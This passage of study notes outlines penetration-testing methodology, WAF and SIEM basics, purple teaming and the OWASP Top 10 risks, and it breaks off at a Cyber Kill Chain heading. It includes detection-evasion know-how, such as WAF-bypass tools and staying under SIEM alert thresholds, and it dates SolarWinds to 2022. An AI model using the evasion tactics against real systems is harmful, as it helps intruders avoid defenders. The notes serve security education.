				□ Use OSINT \& foot printing (DNS, TLS certs, Shodan, etc.).

				□ PTES defines three levels of information gathering to avoid “rabbit holes.”

			§ Threat Modeling

				□ Identify real-world threat actors and emulate their methods.

				□ Analyze business assets \& processes tied to the app.

				□ Incorporate models like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) or DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

			§ Vulnerability Analysis

				□ Use vulnerability scanners (e.g., Burp Suite, OWASP ZAP).

				□ Include APIs \& web services in testing (not just user-facing apps).

				□ Perform both active scans and research (e.g., CVE databases).

				□ Identify and prioritize exploitable weaknesses.

			§ Exploitation

				□ Attempt to exploit identified vulnerabilities.

				□ Plan for countermeasures (e.g., WAF, SOC detection).

				□ Distinguish false positives from real exploitable issues.

				□ Goal: prove the actual risk by compromising the application.

			§ Post-Exploitation

				□ Four key activities:

					® Persistence (maintain access, e.g., backdoors).

					® Privilege Escalation \& Lateral Movement (expand control).

					® Data Exfiltration (extract sensitive/restricted data).

					® Cleanup (remove artifacts/backdoors).

				□ Simulates what real attackers would do after the initial exploit.

			§ Reporting

				□ Most important phase: translate technical results into actionable findings.

				□ Executive Summary: non-technical, focused on business impact.

				□ Technical Details: tools used, techniques, step-by-step explanations.

				□ Goal: readers should be able to replicate tests and trust remediation recommendations.



Types of Pen Tests

	• There are three main types of penetration tests—black box, gray box, and white box—and each offers different perspectives and trade-offs. Organizations should aim to use all three over time to gain a complete picture of their application’s security posture, influenced by factors like time, resources, and testing goals.

	• Key Concepts

		○ Black Box Testing

			§ Tester = outsider with no prior knowledge of the application or controls.

			§ Simulates a real-world attacker’s perspective.

			§ Strength: most realistic external view.

			§ Weakness: may overlook vulnerabilities because the tester doesn’t have insider context.

		○ White Box Testing

			§ Tester is given full internal knowledge: reports, diagrams, scan results, valid credentials.

			§ Goal: maximize tester’s time by focusing directly on the most relevant controls.

			§ Strength: highly thorough, efficient at uncovering flaws.

			§ Weakness: less realistic in simulating a true external attacker’s view.

		○ Gray Box Testing

			§ Middle ground: tester is given some insider knowledge, but not everything.

			§ Balances outsider realism with insider efficiency.

			§ Most common approach in practice.

			§ The amount of info is usually negotiated during pre-engagement.

		○ Factors Influencing Test Type

			§ Time \& Cost: Pen tests range from days to weeks; budget and time constraints shape scope.

			§ Tester Role: Internal red teams can spend more time and conduct repeated tests; external consultants may be time-limited.

			§ Goal of the Test:

				□ Compliance-driven orgs may settle for black/gray box.

				□ Security-mature orgs often combine all three for ongoing assurance.

		○ Recommended Approach

			§ Do all three types at least once to get a well-rounded view.

				□ Start with black box → attacker’s perspective.

				□ Move to gray box → partial insider view.

				□ Establish recurring white box tests → ongoing validation with full knowledge.

			§ Use findings from previous tests to inform scoping and pre-engagement for the next round.



Web Application Firewalls

	• Web Application Firewalls (WAFs) are security tools that filter and inspect HTTP/HTTPS traffic to block malicious requests (like SQL injection and XSS). As an application security tester, you need to understand how WAFs work, how to deploy/tune them effectively, and how attackers may try to evade them.

	• Key Concepts

		○ What a WAF Is

			§ Defensive technology for web traffic, different from a network firewall.

			§ Inspects HTTP/HTTPS payloads instead of just ports/IPs.

			§ Detects malicious patterns (SQLi, XSS) while allowing legitimate traffic.

		○ Benefits

			§ Can virtually patch applications—defend against known exploits while developers work on permanent fixes.

			§ Supports custom rules tailored to an app’s traffic.

		○ Open Source WAF Options

			§ ModSecurity (most popular; Apache module, now broader).

				□ OWASP maintains the ModSecurity Core Rule Set (CRS).

			§ NAXSI (Nginx Anti-XSS \& SQLi).

			§ WebKnight (for IIS).

			§ Shadow Daemon.

			§ OWASP Coraza.

		○ Deployment Best Practices

			§ Start in listen-only mode (monitoring, not blocking).

			§ Collect baseline data on legitimate traffic.

			§ Enable alerts gradually (e.g., for OWASP Top 10 attacks).

			§ Test with vulnerability scans and pen tests before enabling blocking.

			§ Roll out rules incrementally to avoid false positives disrupting production.

		○ Evasion \& Testing

			§ Identifying WAF type:

				□ Look for cookies, HTTP header values, error messages.

				□ Tools: nmap --script http-waf-detect, Wafw00f (Kali Linux).

			§ Evasion techniques:

				□ Manipulate request characters to bypass detection.

				□ White-box pen test: review rule sets, craft payloads that “slip through.”

				□ Tools: WAFNinja (GitHub project).



Security Information and Event Management Program (SIEMs)

	• Security Information and Event Management (SIEM) systems combine log management and incident response automation to detect, correlate, and alert on potential attacks. As a penetration tester, you must understand how SIEMs work, how they’re deployed, and how to avoid triggering alerts during testing.

	• Key Concepts

		○ What a SIEM Is

			§ Combination of two technologies:

				□ SIM (Security Information Management): collects/analyzes logs, extracts events, automates log management.

				□ SEM (Security Event Management): performs real-time threat analysis and incident response automation.

			§ Together: provide centralized log management + incident detection/response.

		○ Core Capabilities

			§ Log aggregation: Collect logs from disparate systems in one searchable interface.

			§ Correlation: Identify relationships/patterns that suggest malicious activity.

			§ Analysis: Allow manual inspection and advanced pattern hunting.

			§ Alerting: Near real-time alerts on suspicious behavior.

		○ Open Source \& Popular SIEM Tools

			§ ELK Stack (Elasticsearch, Logstash, Kibana) – most popular open-source option.

			§ OSSEC+ – host-based IDS usable as SIEM with configuration.

			§ OSSIM (AlienVault) – open-source SIEM, lightweight version of commercial offering.

			§ Snort – IDS/IPS at network level, sometimes used in SIEM setups.

			§ Splunk – commercial, but very popular (free version has data limits).

		○ Cloud-Native SIEMs

			§ AWS: Control Tower.

			§ Azure: Microsoft Sentinel.

			§ Google: Chronicle.

			§ Adoption depends heavily on budget, since cloud services are pay-as-you-go.

		○ Best Practices for SIEM Deployment

			§ Feed logs from all infrastructure components:

				□ Application logs

				□ Web server logs (Apache, IIS)

				□ NetFlow logs

				□ Host OS logs

				□ Database logs

				□ WAF logs

			§ More logs = better detection \& correlation.

			§ Without proper logs, SIEM cannot function effectively.

		○ Pen Testing \& Evasion Strategies

			§ OSINT (Open-Source Intelligence): Safe, since it doesn’t touch monitored systems.

			§ Attack style: Use “low and slow” instead of brute force.

			§ Threshold evasion: SIEMs tune out “noise” by setting thresholds (e.g., 1 failed login/minute = normal; 60/minute = attack). Stay under those thresholds to avoid alerts.

			§ SIEM is not internet-facing → won’t be directly visible in pen tests.



Purple Teaming

	• Traditional penetration testing pits Red Teams (attackers) against Blue Teams (defenders) in an adversarial way, but Purple Teaming emphasizes collaboration between them. By working side by side, sharing techniques, and improving defenses together, organizations strengthen security more effectively than through red vs. blue competition.

	• Key Concepts

		○ Traditional Red vs. Blue

			§ Red Team (Attackers):

				□ Breakers who think like adversaries.

				□ Goal: find ways to bypass controls, exploit weaknesses, and replicate real-world attacker behavior.

				□ Known for “out-of-the-box” and sometimes rule-breaking thinking.

				□ Reference guide: Red Team Field Manual (RTFM).

			§ Blue Team (Defenders):

				□ Builders who focus on prevention, detection, and response.

				□ Goal: ensure layers of security controls (defense-in-depth).

				□ Typical concerns: strong authentication, logging, patching, monitoring.

				□ Reference guide: Blue Team Field Manual (BTFM) (based on the NIST Cybersecurity Framework).

		○ Purple Teaming Defined

			§ A collaborative model where Red and Blue teams work together during penetration tests.

			§ Instead of adversarial secrecy, both sides share tools, techniques, and findings in real time.

			§ Blue Teamers learn how attackers bypass controls.

			§ Red Teamers see how defenders detect/respond and adapt accordingly.

		○ Benefits of Purple Teaming

			§ Knowledge exchange: Attackers show how controls are bypassed; defenders adapt controls immediately.

			§ Faster resilience: Defenses are strengthened iteratively during testing, not months later.

			§ Skill-building: Both teams sharpen expertise—Red learns detection gaps, Blue learns attack methods.

			§ Increased security maturity: Results in stronger production applications and incident response capabilities.

		○ Practical Tips

			§ Recruit creative thinkers internally who can act as Red Teamers.

			§ Recruit detail-oriented defenders for Blue Team roles.

			§ Provide them with respective field manuals (RTFM for Red, BTFM for Blue).

			§ Foster collaboration, not competition, during pen tests.





#### Testing for the OWASP Top Ten



The OWASP Top Ten

	The OWASP Top 10 is the most widely recognized and influential project in application security. It provides a focused starting point for building a testing program without overwhelming developers and testers. Alongside the Top 10, related OWASP projects (Mobile Security and Proactive Controls) help expand security practices to mobile apps and shift security earlier in the development lifecycle.

	• Key Concepts

		○ OWASP Top 10 Overview

			§ Began in early 2000s as a thought experiment → now the cornerstone of application security.

			§ Identifies the 10 most critical web application security risks.

			§ Updated every 3 years, released first in English then translated globally.

			§ Widely adopted in commercial and open-source security tools.

			§ Used for testing, reporting, and industry benchmarking.

		○ Why Start with OWASP Top 10

			§ Prevents overcomplication and overwhelm for testers/developers.

			§ Provides a walk-before-run approach: build a foundation, achieve early wins, then expand.

			§ Ensures focus on high-impact, common risks first.

		○ Related OWASP Projects

			§ OWASP Mobile Application Security Project

				□ Recognizes that mobile app risks differ from web app risks.

				□ Provides:

					® Mobile Top 10

					® Mobile Application Security Testing Guide

					® Mobile Application Security Verification Standard (MASVS)

					® Mobile Application Security Checklist

				□ OWASP Proactive Controls Project

					® Focuses on prevention rather than reaction.

					® Helps developers build security in from the start.

					® Developer-centric → practical steps to avoid introducing vulnerabilities.

				□ Practical Advice

					® Don’t try to test everything at once → focus on the Top 10 risks first.

					® Gain a few successes early to build confidence and momentum.

					® Use Top 10 as the foundation, then expand into mobile and proactive controls as maturity grows.



A1: Broken Access Control

	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when applications fail to properly enforce rules that restrict what authenticated users can do or see. These flaws are difficult for automated scanners to detect and often require manual testing aligned with business rules to identify. Exploiting these flaws can lead to account impersonation, privilege escalation, or unauthorized access to sensitive data.

	• Key Concepts

		○ What is Broken Access Control?

			§ Access control = restrictions on what authenticated users can do.

			§ Broken access control = when users can go beyond their intended permissions.

			§ Examples:

				□ A user accessing another’s data.

				□ A low-privileged user escalating to admin rights.

				□ Accessing restricted directories or APIs.

		○ Why It’s a Serious Risk

			§ Automated scanners struggle to detect these flaws since they don’t understand business rules.

			§ Business-specific rules vary (e.g., who can reset whose password).

			§ Developers may miss controls without a standardized access management framework.

			§ Impact can range from annoyance → full application takeover.

		○ Testing for Broken Access Control

			§ Manual testing is essential.

			§ Check:

				□ Account provisioning (self-registration vs. manual request).

				□ Directory protections (unprotected folders, directory listing disabled).

				□ Privilege escalation paths (can you assign yourself new permissions?).

			§ OWASP Web Security Testing Guide:

				□ Identity management tests (Section 4.3).

				□ Authorization tests (Section 4.5).

		○ Preventive Measures \& Best Practices

			§ Default deny mindset → deny everything unless explicitly allowed.

			§ Role-based access control (RBAC) → re-use standardized mechanisms.

			§ Validate permissions on every request → never assume continued authorization.

			§ Logging and monitoring → developers implement logging, security teams monitor/respond.

			§ Rate limiting → prevent automated brute-force or abuse of APIs.

			§ Disable directory listing at web server level.

			§ Use the OWASP Authorization Cheat Sheet:

				□ Enforce least privilege.

				□ Deny by default.

				□ Validate permissions rigorously.

		○ Example Attack

			§ Pen tester exploited an app with identical user permissions.

			§ Changed user identifier post-login → impersonated other users.

			§ Found an admin account → full takeover of application.



A2: Cryptographic Failures

	• Cryptographic failures occur when sensitive data is not properly protected at rest or in transit. These flaws can allow attackers to steal or manipulate data without exploiting deeper vulnerabilities like injection or broken access controls. Proper planning, implementation, and management of encryption, hashing, and encoding are essential to prevent data breaches, regulatory fines, and reputational damage.

	• Key Concepts

		○ What Are Cryptographic Failures?

			§ Occur when sensitive data is:

				□ Unencrypted in transit (e.g., HTTP instead of HTTPS).

				□ Unencrypted at rest (e.g., passwords or PII stored in plaintext).

				□ Improperly encrypted (weak algorithms, poor key management).

				□ Accessible without controls (misconfigured directories).

			§ Result: Data can be stolen without advanced exploitation.

		○ Common Causes

			§ Encryption not defined in early design requirements.

			§ Improper implementation (e.g., weak keys, outdated ciphers, storing raw secrets).

			§ Confusion between:

				□ Encryption → reversible with a key.

				□ Hashing → one-way, used for integrity and passwords.

				□ Encoding → reversible, not security (e.g., Base64).

		○ Risks \& Impact

			§ Data breaches exposing sensitive personal, financial, or healthcare data.

			§ Regulatory fines: GDPR, CCPA, PIPEDA, HIPAA.

			§ Business damage: cost, reputation loss, compliance penalties.

			§ Attack scenarios:

				□ Adversary-in-the-middle attack steals data in transit.

				□ Weak ciphers downgraded or brute-forced.

				□ Cached sensitive data extracted.

		○ Best Practices \& Mitigations

			§ Data classification policy: Define what is “sensitive” and how it must be protected.

			§ Encrypt everywhere:

				□ Data in transit (TLS/SSL).

				□ Data at rest (disk/database).

			§ Avoid unnecessary data storage/transmission: Less data = less exposure.

			§ Strong password storage: Salted hashing functions (bcrypt, Argon2).

			§ Disable caching of sensitive data.

			§ Key management: Define lifecycle, rotation, and storage practices.

			§ Use strong algorithms: Avoid known-weak ciphers (e.g., MD5, SHA-1, RC4).

		○ OWASP Resources

			§ OWASP Web Security Testing Guide (4.9) → tests for weak cryptography.

			§ OWASP Cheat Sheets:

				□ Transport Layer Protection.

				□ User Privacy Protection.

				□ Password Storage.

				□ Cryptographic Storage.

			§ OWASP Proactive Controls (C8) → emphasizes classifying data, encryption in transit \& at rest, and key/secret management processes.



A3: Injection

	• Injection flaws (e.g., SQL injection, command injection) occur when untrusted input is sent to a backend interpreter (SQL database, OS command shell, LDAP, XML parser, etc.) without proper validation or sanitization. Since interpreters execute any commands they’re given, attackers can manipulate inputs to execute malicious commands, extract sensitive data, or even take control of entire servers. Injection remains one of the most critical and long-standing risks in the OWASP Top 10.

	• Key Concepts

		○ What is Injection?

			§ Occurs when untrusted input is sent to a backend interpreter.

			§ Interpreters (SQL, OS commands, LDAP, etc.) don’t validate intent—they just execute commands.

			§ Attackers exploit this by manipulating input fields, parameters, or requests.

		○ Attack Vectors

			§ Form fields (login forms, search boxes).

			§ URL parameters (GET/POST variables).

			§ Environment variables.

			§ Application parameters (JSON, XML, API calls).

			§ User-supplied data anywhere input is accepted.

		○ Techniques Used by Attackers

			§ Escape characters: trick interpreters into reinterpreting data as commands.

			§ SQL Injection (SQLi): e.g., making “1=1” true to log in as admin.

			§ Parameter tampering: Adding extra parameters to search queries or JSON.

			§ Command injection: Sending OS-level commands via the app.

			§ Other types: LDAP, NoSQL, XML, XPath, SMTP, IMAP, ORM, SSI injection.

		○ Impacts

			§ Unauthorized data access (e.g., dump entire database).

			§ Privilege escalation.

			§ Compromise of backend servers (full system takeover).

			§ Large-scale data breaches → reputational \& financial damage.

		○ Testing Guidance

			§ Focus dynamic testing on form fields and URL parameters.

			§ OWASP Testing Guide (Section 4.7) → detailed coverage of multiple injection types.

			§ Look for exploitable queries, commands, or parameters.

		○ Prevention \& Mitigation

			§ Use safe APIs and ORM (Object Relational Mapping) tools → avoid raw query construction.

			§ Whitelist input validation (restrict allowed values when feasible).

			§ Encode input before sending to interpreters (to neutralize malicious characters).

			§ Escape special characters properly if dynamic queries are unavoidable.

			§ Use native controls (e.g., LIMIT in SQL to restrict data exposure).

			§ Avoid trusting user input → always sanitize.

		○ Resources

			§ OWASP Injection Prevention Cheat Sheet → examples and secure coding practices.

			§ Bobby Tables (XKCD-inspired) → practical, language-specific SQL injection prevention guide.



A4: Insecure Design

	• Insecure design refers to flaws built into an application’s architecture from the start. Unlike coding/implementation errors, these flaws originate in the planning and design phase of the SDLC. Because they stem from missing or misunderstood business risks, insecure design flaws can’t be fixed with perfect implementation—they require a shift toward secure design practices early in development, threat modeling, and use of maturity models like SAMM and BSIMM.

	• Key Concepts

		○ What is Insecure Design?

			§ Security flaws introduced before code is written, due to poor planning.

			§ Examples:

				□ No mechanism to delete personal data → GDPR violations.

				□ Business risks misunderstood or undocumented.

			§ Design flaws ≠ implementation flaws:

				□ Secure design can mitigate coding mistakes.

				□ But good coding can’t fix insecure design.

		○ Why It’s Risky

			§ Overlooked because organizations often focus on fixing vulnerabilities instead of building security into design.

			§ User stories may emphasize functionality only, ignoring security requirements.

			§ Costly to remediate after deployment → cheaper to design securely upfront.

		○ How to Identify Insecure Design

			§ Review documentation:

				□ SDLC process → does it account for security?

				□ Software Bill of Materials (SBOM): are any libraries insecure?

				□ Test cases \& tools: are security tests integrated into CI/CD?

			§ Look for absence of security-focused design patterns.

		○ How to Address the Risk

			§ Threat modeling: anticipate how attackers might exploit the system.

			§ Reference architectures: reuse proven secure designs (e.g., AWS, Azure, GCP).

			§ Document secure design patterns: e.g., “never put user ID in the URL string.”

			§ Define misuse/abuse cases: simulate how attackers would exploit the design.

			§ Build test cases around threats to validate resilience.

			§ Use maturity models to measure and improve secure design:

				□ OWASP SAMM (Software Assurance Maturity Model).

				□ BSIMM (Building Security In Maturity Model).

		○ Culture \& Process Shift

			§ Requires a mindset change: security is not just QA or post-development.

			§ Needs buy-in from developers, architects, and leadership.

			§ Moves security from an afterthought to a core requirement of business processes.



A5: Security Misconfiguration

	• Security misconfiguration is one of the most common and dangerous OWASP Top 10 risks. It refers to insecure, default, or poorly maintained configurations in applications, servers, or infrastructure. These flaws often arise from weak patch management, verbose error handling, default settings, or improperly secured cloud storage. Misconfigurations can lead to data breaches, system compromise, or attacker advantage — but they’re also among the easiest vulnerabilities to detect and fix when processes and documentation are in place.

	• Key Concepts

		○ Definition

			§ Insecure or default configurations in applications or infrastructure.

			§ Can occur in OS, servers, frameworks, libraries, cloud storage, or application settings.

			§ Includes verbose error messages, exposed config files, weak permissions, unpatched software, or unnecessary components.

		○ Causes of Misconfiguration

			§ Default or insecure settings left enabled (e.g., sample pages, README files).

			§ Verbose error messages exposing stack traces or system details.

			§ Patch management failures: missing updates for OS, frameworks, libraries, apps.

			§ Infrastructure changes that introduce new default configs.

			§ Application changes that add insecure libraries/frameworks.

			§ Cloud storage misconfigurations (open S3 buckets, overly permissive roles).

		○ Risks and Impacts

			§ Range from minor (info disclosure from error messages) to severe (data breaches, full system compromise).

			§ Example:

				□ Directory permissions exposing sensitive files.

				□ World-readable config files containing database credentials.

				□ PHP info pages revealing backend details.

		○ Detection and Testing

			§ Automated vulnerability scanners are effective (binary checks: patch missing or not, version outdated or not).

			§ Dynamic testing → intentionally trigger errors (e.g., HTTP 500) to check error handling and logging.

			§ OWASP Web Security Testing Guide Section 4.2 → 11 tests for security misconfigurations.

		○ Prevention and Mitigation

			§ Documented, repeatable hardening procedures for apps and infrastructure.

			§ Integrate into change control process.

			§ Remove unnecessary components/services (reduce attack surface).

			§ Cloud storage best practices: deny-all first, then grant minimum required access.

			§ Use segmentation and containerization to contain threats.

			§ Restrict verbose error handling to non-production only.

		○ Logging and Monitoring

			§ Proper logging essential for detecting and responding to incidents.

			§ Use resources like Lenny Zeltser’s Critical Log Review Checklist to guide log collection and monitoring.

			§ Ensure security teams can produce logs during incidents with confidence.



A6: Vulnerable and Outdated Components

	• Applications often rely on third-party components (libraries, frameworks, modules), and if these contain known vulnerabilities or are outdated, no configuration changes can protect the app. Without an inventory and maintenance process, these components become high-risk entry points for attackers (e.g., Drupalgeddon, Log4Shell). Preventing this requires streamlining dependencies, maintaining a Software Bill of Materials (SBOM), and continuously monitoring and updating components.

	• Key Concepts

		○ Definition \& Nature of the Risk

			§ Using components with known vulnerabilities introduces risks into web apps.

			§ Different from security misconfiguration: you can’t “configure away” a vulnerability in a component.

			§ Risks increase with application complexity and reliance on third-party libraries.

		○ Why It Happens

			§ Developers adopt components for fast, proven solutions without always reviewing their security.

			§ Lack of inventory or SBOM makes it difficult to track what’s being used.

			§ Projects or libraries may become unsupported/dormant, leaving vulnerabilities unpatched.

		○ Notable Examples

			§ Drupalgeddon (2014) – catastrophic Drupal CMS flaw.

			§ Drupalgeddon2 (2018) – similar repeat exposure.

			§ Log4Shell (2021) – Log4j RCE impacting systems worldwide.

			§ Illustrates high business impact when critical components are vulnerable.

		○ Business Impact

			§ Varies by severity of flaw + role of the application.

			§ Could lead to data breaches, service outages, or full compromise.

			§ Harder to remediate than misconfigurations — sometimes apps depend on vulnerable components.

		○ Detection \& Testing

			§ Automated vulnerability scanners excel at finding outdated components.

				□ Flag known versions (e.g., old Log4j).

				□ Can be fooled by custom banners masking version numbers.

			§ OSINT + web proxies → capture traffic, identify component versions, and cross-check with CVE databases.

		○ Best Practices \& Mitigation

			§ Remove unnecessary components – streamline dependencies.

			§ Maintain a Software Bill of Materials (SBOM) with:

				□ Maintain a Software Bill of Materials (SBOM) with:

				□ Use case

				□ Version

				□ Source location

			§ Use only trusted, signed components from reliable repositories.

			§ Continuously monitor updates \& activity around projects (avoid dormant projects).

		○ Resources \& Tools

			§ OWASP Dependency-Check – Software Composition Analysis (SCA) tool for Java/.NET (works with Maven, Gradle, Jenkins, SonarQube, etc.).

			§ MITRE CVE database – central repository of publicly disclosed vulnerabilities.

			§ Other SCA tools can help identify vulnerable open-source dependencies across different ecosystems.

			



A7: Identification and Authentication Failures

	• Applications are vulnerable if authentication and session management controls are weak or misconfigured. Attackers can bypass logins, reuse stolen credentials, or hijack sessions to gain unauthorized access. Strong identity and access management (IAM), secure session handling, and multifactor authentication (MFA) are essential to preventing these failures.

	• Key Concepts

		○ Nature of the Risk

			§ Identification and authentication failures occur when:

				□ Login controls are weak (default passwords, poor password policies, missing MFA).

				□ Session management is insecure (predictable or reusable session tokens).

			§ Attackers exploit stolen credentials, brute force, credential stuffing, or session hijacking.

		○ Causes

			§ Lack of IAM planning early in development (no standards on password strength, MFA, session rules).

			§ Weak session controls: no lockouts, predictable session IDs, session reuse, simultaneous logins from multiple devices.

			§ Default or guessable credentials still active in production.

		○ Examples of Impact

			§ Low impact: Library app exposing borrowing history.

			§ High impact: Banking app enabling account takeovers and wire transfers.

			§ Critical impact: Infrastructure admin app compromise → full environment takeover.

		○ Testing Considerations

			§ Inspect login and logout flows, cookies, and session variables.

			§ Look for predictable or reusable session IDs (e.g., in URLs).

			§ Validate that weak or default passwords are rejected.

			§ Confirm account lockout and IP lockout for repeated failed logins.

			§ Use OWASP Web Security Testing Guide:

				□ Section 4.3 → identity management (5 tests).

				□ Section 4.4 → authentication (10 tests).

				□ Section 4.6 → session management (9 tests).

		○ Mitigation Best Practices

			§ Multifactor authentication (MFA): Strongest defense against credential misuse.

			§ password hygiene:

				□ Block weak, default, and known-compromised passwords.

				□ Avoid overly complex requirements that harm usability.

				□ Use thoughtful password reset questions (not guessable from social media).

			§ Session management:

				□ Implement on the server-side (client-side controls are easily bypassed).

				□ Use secure cookies, invalidate tokens at logout, expire sessions after inactivity.

				□ Ensure tokens are unpredictable and not exposed in URLs.

			§ Monitoring \& lockouts:

				□ Enforce login attempt lockouts (per account + per IP).

				□ Alert on suspicious login attempts or credential stuffing.

		○ Supporting Resources

			§ OWASP Cheat Sheets:

				□ Authentication

				□ Credential Stuffing Prevention

				□ Password Reset

				□ Session Management

			§ OWASP Web Security Testing Guide → concrete tests for IAM and session flaws.



A8: Software and Data Integrity Failures

	• Software and data integrity failures occur when applications, components, or processes blindly trust unverified code, data, or updates. Without mechanisms to validate integrity, attackers can slip in malicious code (supply-chain attacks, pipeline tampering, untrusted updates), leading to breaches on a massive scale.

	• Key Concepts

		○ What the Risk Is

			§ Based on assumed trust:

				□ That user-provided data is what’s expected.

				□ That software components behave as intended.

			§ If this trust is misplaced, attackers can exploit the gap.

			§ This category evolved from Insecure Deserialization in OWASP 2017, broadened to include integrity flaws in software supply chains and CI/CD pipelines.

		○ How It Happens

			§ Unvalidated updates: Automatic or manual updates applied without integrity checks.

			§ Third-party libraries: Developers pull dependencies from external repos without verifying authenticity.

			§ CI/CD pipeline weaknesses: Poor access controls or weak change management allow tampering.

			§ Serialized/encoded data flaws: Lack of validation lets attackers smuggle malicious payloads.

		○ Examples

			§ PyPI incident (2022): A student uploaded ransomware to the Python Package Index; it was downloaded hundreds of times.

			§ SolarWinds (2022): Attackers poisoned Orion software updates, breaching ~30,000 orgs, including enterprises and governments.

			§ General risk: Once attackers compromise integrity, they can run their own code as if it’s trusted.

		○ Detection and Testing

			§ Validate digital signatures for updates, libraries, and components.

			§ Use an SBOM (Software Bill of Materials) to know what libraries are in your stack.

			§ Review SDLC documentation (especially code reviews \& change control).

			§ Check CI/CD pipeline controls for weak permissions and poor configuration management.

		○ Mitigation and Best Practices

			§ SBOMs: Maintain a full inventory of components and dependencies.

			§ Digital signature validation: Automate verification before trusting code or updates.

			§ Internal repositories: Vet external libraries, then host them in a trusted repo for devs to use.

			§ Good documentation: Clear SDLC standards, code review processes, and change control policies.

			§ Third-party vetting: Scan libraries for vulnerabilities before integrating them.

		○ Helpful Tools \& Resources

			§ OWASP CycloneDX: Standard for building SBOMs, includes guidance, advisory format, and ~200 supporting tools.

			§ OWASP Dependency-Check: Automates software composition analysis (SCA), scanning dependencies for known vulnerabilities (via CVE databases).



A9: Security Logging and Monitoring Failures

	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without them, attackers can operate undetected, moving from reconnaissance to exploitation and full compromise. Logging and monitoring are essential for early detection, containment, and response to attacks.

	• Key Concepts

		○ Why These Failures Happen

			§ Developers prioritize functionality and go-live deadlines over logging.

			§ Security logging requirements often aren’t defined in the project.

			§ Developers may lack security training or awareness of the risks.

			§ Missing policies, standards, and documentation leave teams without guidance.

		○ Impact of Logging Failures

			§ Reconnaissance phase: attackers probe apps—if logs detect this, damage is negligible.

			§ Attack phase: if recon goes unnoticed, attackers attempt injections, brute force, etc.—impact increases.

			§ Full compromise: without logging/alerts, attackers can breach data, take over systems, or cause outages.

			§ Severity depends on application criticality and whether it processes sensitive/restricted data.

		○ Detection \& Testing

			§ Failures are hard to spot in black box tests (no internal visibility).

			§ Better tested with white box or gray box approaches, often via purple teaming (red team + blue team collaboration).

			§ Blue team must validate whether logs:

				□ Were generated.

				□ Contain required details.

				□ Triggered alerts and responses.

		○ Mitigation \& Best Practices

			§ Log high-value events:

				□ Login activity (success/failure).

				□ Access control failures.

				□ Input validation failures.

			§ Centralize logs on a secure server (prevents tampering and supports correlation).

			§ Implement integrity controls to detect log modification/deletion.

			§ Ensure logs are reviewed and acted upon, not just collected.

		○ Resources

			§ Lenny Zeltser’s Critical Log Review Cheat Sheet – practical guidance for incident logging.

			§ NIST SP 800-61 Rev 2 – Computer Security Incident Handling Guide.

			§ Intelligence Community Standard (ICS) 500-27 – advanced guidance on audit data collection and sharing.



A10: Server-Side Request Forgery (SSRF)

	• Server-Side Request Forgery (SSRF) vulnerabilities allow attackers to trick a server into making unintended requests, often to internal systems or sensitive resources, bypassing security boundaries. SSRF is increasingly dangerous in cloud environments and has caused multiple major breaches.

	• Key Concepts

		○ What SSRF Is

			§ An attacker manipulates server-side URL requests to access or abuse internal resources.

			§ Differs from command injection:

					® Command injection = attacker forces server to run system-level commands.

					® SSRF = attacker tricks server into making network requests, possibly leading to further compromise.

		○ How SSRF Works

			§ Attacker supplies a crafted URL or input field value.

			§ If the app doesn’t validate URLs, the server will process requests like:

				□ Local file access (e.g., /etc/passwd on Linux).

				□ Internal network mapping (hostnames, IPs, ports).

				□ Requests to attacker-controlled URLs → enabling malicious code execution or DoS.

			§ Cloud misconfigurations (like exposed storage buckets) amplify the risk.

		○ Risks \& Impact

			§ Unauthorized access to internal services (databases, APIs).

			§ Data theft (sensitive files).

			§ Remote code execution (RCE).

			§ Denial-of-service (overloading internal servers).

			§ Breaches in cloud-hosted systems due to overly permissive network access.

		○ Testing \& Indicators

			§ Look for weak/missing URL validation.

			§ Check if the app trusts all user-supplied URLs.

			§ Evaluate architecture: does network segmentation restrict internal traffic?

			§ Validate how the app handles redirects and other protocols (not just HTTP).

		○ Mitigation Strategies

			§ Input validation \& sanitation of URLs.

			§ Deny HTTP redirects to attacker-controlled destinations.

			§ Use allow-lists (preferred over deny-lists) to restrict outbound traffic to known safe destinations.

			§ Network segmentation to limit what internal services are reachable.

			§ Strong cloud security configuration standards to prevent misconfigured buckets/endpoints.

		○ Resources

			§ OWASP SSRF Prevention Cheat Sheet – practical safeguards for developers.

			§ SSRF Bible (Wallarm research team) – in-depth guide with attack/defense examples (23-page PDF).

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Penetration Testing

#### What is Pen Testing?





Pen Testing Overview

	• Security testing evolved from “prove it works” to “assume it will be attacked.” Pen testing applies an attacker’s mindset, tools, and creativity to uncover weaknesses that functional tests and vuln scanners miss.

	• Key Concepts

		○ Functional testing vs. pen testing: From validating expected behavior to actively trying to break things with unexpected inputs (e.g., command injection, crafted packets).

		○ “Think like a developer” → “Think like an attacker”: Imagination and adversarial tactics are central to modern testing.

		○ Hacker taxonomy

			§ White hats: Authorized testers.

			§ Black hats: Unauthorized (including script kiddies, research hackers, cybercriminals, state-sponsored actors).

			§ Script kiddies: Run prebuilt tools with little skill.

			§ Research hackers: Discover bugs/zero-days, sometimes sell exploits.

			§ State-sponsored \& organized crime: Skilled, stealthy, use zero-days, cause major damage.

		○ Tooling \& frameworks

			§ Individual tools (commercial/community, freeware/shareware).

			§ Kali Linux: A primary free distro bundling 600+ tools; common pen-test platform.

		○ Roles \& skill tiers

			§ Ethical hacker: Runs standard tests to raise baseline assurance.

			§ Pen tester: Deeper skills; finds sophisticated weaknesses; can demonstrate exploitability (modify/create exploits).

			§ Elite pen tester: Highest skill; often discovers zero-days; contributes tools to the community.

		○ Certifications / learning path

			§ CEH: Foundational, now hands-on; entry to ethical hacking/pen testing.

			§ OSCP (PEN-200) from Offensive Security: Benchmark for professional pen testers; proves applied skill against unknown targets.

		○ Pen testing vs. vulnerability scanning

			§ Vuln scanning (e.g., perimeter services, internal scanners like Nessus, Rapid7/Nexpose): Checks for known issues.

			§ Pen testing: Goes beyond signatures to uncover oversights and unknown/zero-day paths.

		○ Red teaming

			§ Unannounced, authorized, full-scope attack simulation across the enterprise; goal is to reach internal systems like a real adversary.

		○ Cyber hunting (threat hunting)

			§ Proactively analyzes networks/servers for indicators of compromise using NIDS and security analytics; an emerging discipline expected to grow.



The Cyber Kill Chain

